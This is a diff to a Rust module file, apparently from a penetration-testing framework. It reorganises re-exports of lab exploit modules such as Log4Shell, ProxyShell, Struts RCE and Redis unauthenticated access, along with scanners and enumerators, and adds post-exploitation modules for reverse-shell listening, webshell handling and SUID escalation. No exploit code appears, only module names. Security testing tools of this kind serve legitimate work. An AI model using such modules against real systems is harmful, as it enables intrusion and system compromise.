 // ─── Lab Modules Re-exports ──────────────────────────────────────────────────
 
 pub mod lab_exploits {
-    pub use rcf_labs::exploits::*;
-    pub use rcf_labs::missing_vulns::{SSTI, Deserialization, SsrfExploit, Kerberoast, AsRepRoast};
     pub use rcf_labs::advanced_exploits::{Log4Shell, ProxyShell};
-    pub use rcf_labs::protocol_exploits::{RedisUnauth, MySQLBypass, PostgresRCE, TomcatDeploy, JenkinsScriptConsole, WpPluginUpload};
-    pub use rcf_labs::real_exploits::{BlueKeep, EternalBlue};
-    pub use rcf_labs::more_protocol_exploits::{VncAuthBypass, MongoUnauth, ElasticRCE, DockerAPI, WinRmLogin};
+    pub use rcf_labs::exploits::*;
+    pub use rcf_labs::missing_vulns::{AsRepRoast, Deserialization, Kerberoast, SSTI, SsrfExploit};
+    pub use rcf_labs::more_protocol_exploits::{
+        DockerAPI, ElasticRCE, MongoUnauth, VncAuthBypass, WinRmLogin,
+    };
+    pub use rcf_labs::protocol_exploits::{
+        JenkinsScriptConsole, MySQLBypass, PostgresRCE, RedisUnauth, TomcatDeploy, WpPluginUpload,
+    };
+    // Windows-only - commented out for Linux-only build
+    // pub use rcf_labs::real_exploits::{BlueKeep, EternalBlue};
+    pub use rcf_labs::web_exploits::{JenkinsRCE, PhpCgiRCE, StrutsRCE2017, StrutsRCE2018};
 }
 
 pub mod lab_scanners {
-    pub use rcf_labs::scanners::*;
-    pub use rcf_labs::missing_vulns::{XssScanner, KerbEnum, LdapSearch, SmbEnum, SnmpEnum, RdpEnum, VncEnum};
-    pub use rcf_labs::protocol_exploits::SmtpEnum;
-    pub use rcf_labs::protocol_exploits::SnmpBrute;
+    pub use rcf_labs::missing_vulns::{
+        KerbEnum, LdapSearch, RdpEnum, SmbEnum, SnmpEnum, VncEnum, XssScanner,
+    };
     pub use rcf_labs::more_protocol_exploits::MemcachedEnum;
     pub use rcf_labs::more_protocol_exploits::NfsEnum;
+    pub use rcf_labs::network_enum::{
+        SmtpScanner as SmtpNetworkEnum, SnmpScanner as SnmpNetworkEnum, TelnetClient,
+    };
+    pub use rcf_labs::protocol_exploits::SmtpEnum;
+    pub use rcf_labs::protocol_exploits::SnmpBrute;
+    pub use rcf_labs::scanners::*;
 }
 
 pub mod lab_post {
     pub use rcf_labs::post_exploit::*;
+    pub use rcf_labs::post_linux::{
+        LinuxPostEnum, ReverseShellListener, SuidEscalation, WebshellHandler,
+    };
 }
-
